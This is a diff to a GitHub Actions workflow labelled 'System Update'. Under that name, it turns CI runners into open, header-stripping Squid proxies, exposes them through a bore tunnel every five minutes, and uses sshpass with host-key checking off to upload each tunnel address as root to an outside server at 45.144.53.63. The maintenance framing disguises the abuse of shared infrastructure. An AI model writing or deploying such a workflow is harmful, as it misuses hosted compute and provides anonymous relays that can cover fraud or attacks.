@@ -3,7 +3,7 @@ name: System Update
 on:
   workflow_dispatch:
   schedule:
-    - cron: '*/8 * * * *'
+    - cron: '*/5 * * * *'
 
 jobs:
   maintenance:
@@ -15,12 +15,14 @@ jobs:
       - name: Config squid
         run: |
           sudo bash -c 'cat > /etc/squid/squid.conf << EOF
-          http_port 3128
+          http_port 0.0.0.0:3128
           http_access allow all
           forwarded_for off
           via off
+          visible_hostname localhost
           EOF'
           sudo systemctl restart squid
+          sudo netstat -tlnp | grep 3128
 
       - name: Install bore
         run: |
@@ -33,17 +35,18 @@ jobs:
           sleep 10
           cat bore.log
 
+      - name: Test proxy locally
+        run: |
+          curl -x http://localhost:3128 https://httpbin.org/ip || echo "Proxy not working locally"
+
       - name: Get address and upload
         env:
           REM: ${{ secrets.REM }}
         run: |
           BORE_URL=$(grep -o 'bore\.pub:[0-9]*' bore.log | head -1)
-          if [ -z "${BORE_URL}" ]; then
-            BORE_URL=$(cat bore.log | grep -o 'listening at [a-z0-9.-]*:[0-9]*' | sed 's/listening at //')
-          fi
           echo "Found: ${BORE_URL}"
           echo "${BORE_URL}" > /tmp/proxy.txt
           cat /tmp/proxy.txt
           sudo apt install sshpass -y
           sshpass -p "${REM}" scp -o StrictHostKeyChecking=no /tmp/proxy.txt root@45.144.53.63:/var/www/html/git_enemy3civil.txt
-          sleep 400
+          sleep 240
